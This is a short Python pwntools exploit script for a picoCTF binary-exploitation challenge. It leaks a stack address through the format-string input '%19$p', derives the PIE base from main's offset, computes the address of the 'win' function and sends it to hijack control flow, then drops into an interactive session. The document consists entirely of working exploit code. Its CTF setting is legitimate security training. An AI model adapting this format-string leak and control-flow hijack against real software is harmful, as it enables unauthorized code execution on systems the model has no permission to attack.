from pwn import *

elf = ELF("./vuln")
p = process("./vuln")
#p = remote("nc rescued-float.picoctf.net", 52653)

p.recvuntil(b"name:")

p.sendline(b"%19$p")
leak = int(p.recvline().strip(),16)
log.info(f"leak address: {hex(leak)}")

main_addr = (elf.sym['main'] + 0x41)

base_address = leak - main_addr
log.info(f"main: {hex(main_addr)}")

win_addr = elf.sym['win']
print(hex(win_addr))
win = base_address + win_addr
log.info(f"win: {hex(win)}")

pay = f"{win:x}".encode()
#pay = f"hex{win}"
print(pay)

p.sendafter(b"0x12345: ", pay)
p.interactive()
